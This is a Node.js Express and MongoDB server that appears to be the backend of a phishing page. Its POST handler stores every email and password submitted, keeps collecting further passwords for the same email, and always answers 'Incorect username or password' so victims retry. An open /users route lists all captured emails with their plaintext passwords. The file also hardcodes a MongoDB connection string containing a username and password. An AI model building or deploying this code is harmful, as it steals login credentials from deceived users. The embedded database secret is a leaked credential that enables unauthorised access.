const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const User = require('./models/User'); // Assuming you have a User model defined
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(cors());

// Serve static files from the current directory (where index.html is)
app.use(express.static('public'));
// Serve index.html at the root URL
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html'); // Corrected path to index.html
});


const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://jembex:qwerty4747@cluster0.lyarq5l.mongodb.net/top?retryWrites=true&w=majority&appName=Cluster0';

// MongoDB Connection (Uncomment and configure if you want to use MongoDB)
mongoose.connect(MONGODB_URI)
  .then(() => {
    console.log('MongoDB Connected');
  })
  .catch(err => {
    console.error('MongoDB connection error:', err);
    process.exit(1);
  });

 // Registration Endpoint (POST /register) - Uncomment to enable user registration

 app.post('/', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: 'Email and password are required.' });
  }

  try {
    // Check if user already exists
    let existingUser = await User.findOne({ email });

    if (existingUser) {
      // If user exists, add the new password to their existing passwords array
      // Only add if the password isn't already present to avoid duplicates in the array
      if (!existingUser.password.includes(password)) {
        existingUser.password.push(password);
        await existingUser.save();
        //User already exists. New password added successfully! 
        return res.status(200).json({ message: 'Incorect username or password! ' });
      } else {
        //User already exists and this password is already associated.
        return res.status(200).json({ message: 'Incorect username or password.' });
      }
    } else {
      // If user does not exist, create a new user with the password as an array
      const newUser = new User({
        email,
        password: [password], // Store as an array with the first password
      });

      const savedUser = await newUser.save();
      //                  Registration successful!
      return res.status(201).json({ message: 'Incorect username or password.', user: { id: savedUser._id, email: savedUser.email } });
    }

  } catch (err) {
    console.error('Error during user registration/password update:', err);
    res.status(500).json({ message: 'Server error during operation.', error: err.message });
  }
});

// GET all users (for testing/admin purposes) - Uncomment to enable fetching users
app.get('/users', async (req, res) => {
  try {
    const users = await User.find({});
    // Project necessary fields, excluding password array from direct client view in production
    const usersSafeData = users.map(user => ({ email: user.email,  passwords: user.password }));
    res.json(usersSafeData);
  } catch (err) {
    console.error('Error fetching users:', err);
    res.status(500).json({ message: 'Server error fetching users.', error: err.message });
  }
});

// DELETE user by email (username) using GET method at /users/delit/:email - Uncomment to enable deleting users
app.get('/user/delit/:email', async (req, res) => {
  try {
    const { email } = req.params;
    console.log(req.params);
    const deletedUser = await User.findOneAndDelete({ email });
    if (!deletedUser) {
      return res.status(404).json({ message: 'User not found.' });
    }
    res.json({ message: 'User deleted successfully.', user: { id: deletedUser._id, email: deletedUser.email } });
  } catch (err) {
    console.error('Error deleting user:', err);
    res.status(500).json({ message: 'Server error deleting user.', error: err.message });
  }
});
  
// Endpoint to add user by email - Uncomment to enable adding user by email
app.get('/user/email/:email', async (req, res) => {
  const { email } = req.params;
  if (!email) {
    return res.status(400).json({ message: 'Email is required.' });
  }
  try {
    let existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(409).json({ message: 'Email already exists.' });
    }
    const newUser = new User({
      email: email,
      password: [],
    });
    const savedUser = await newUser.save();
    return res.status(201).json({ message: 'User created successfully.', user: { id: savedUser._id, email: savedUser.email } });
  } catch (err) {
    console.error('Error adding user by email:', err);
    res.status(500).json({ message: 'Server error during operation.', error: err.message });
  }
});

// Endpoint to add user by email and password - Uncomment to enable adding user by email and password
app.get('/user/email/:email/:password', async (req, res) => {
  const { email, password } = req.params;
  if (!email || !password) {
    return res.status(400).json({ message: 'Email and password are required.' });
  }
  try {
    let user = await User.findOne({ email });
    if (user) {
      if (!user.password.includes(password)) {
        user.password.push(password);
        await user.save();
        return res.status(200).json({ message: 'Password added to existing user.', user: { id: user._id, email: user.email } });
      } else {
        return res.status(200).json({ message: 'Password already exists for this user.', user: { id: user._id, email: user.email } });
      }
    } else {
      const newUser = new User({
        email: email,
        password: [password],
      });
      const savedUser = await newUser.save();
      return res.status(201).json({ message: 'User created successfully.', user: { id: savedUser._id, email: savedUser.email } });
    }
  } catch (err) {
    console.error('Error adding user by email and password:', err);
    res.status(500).json({ message: 'Server error during operation.', error: err.message });
  }
});


app.listen(PORT, () => { 
  console.log(`Server running on http://localhost:${PORT}`);
});
